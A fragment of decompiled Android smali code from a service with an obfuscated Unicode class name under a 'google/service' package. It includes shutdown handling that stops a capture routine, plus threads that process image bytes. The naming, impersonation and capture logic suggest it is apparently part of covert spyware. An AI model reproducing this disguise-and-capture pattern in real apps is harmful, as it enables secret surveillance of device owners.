    invoke-virtual {p0, p1}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 96
    :cond_2
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    const-string p2, "splash.app.main.SHUTDOWN"

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    const/4 p1, 0x0

    .line 98
    sput-boolean p1, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->ISON:Z

    .line 99
    invoke-direct {p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->stopCapture()V

    const/4 p1, 0x1

    .line 100
    invoke-virtual {p0, p1}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->stopForeground(Z)V

    .line 101
    invoke-virtual {p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->stopSelf()V

    :cond_3
    :goto_0
    const/4 p1, 0x2

    return p1
.end method

.method public pr()V
    .locals 2

    .line 128
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791$1;

    invoke-direct {v1, p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791$1;-><init>(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 173
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method processImage([B)V
    .locals 1

    .line 231
    new-instance v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791$3;

    invoke-direct {v0, p0, p1}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791$3;-><init>(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;[B)V

    .line 249
    invoke-virtual {v0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791$3;->start()V

    return-void
.end method
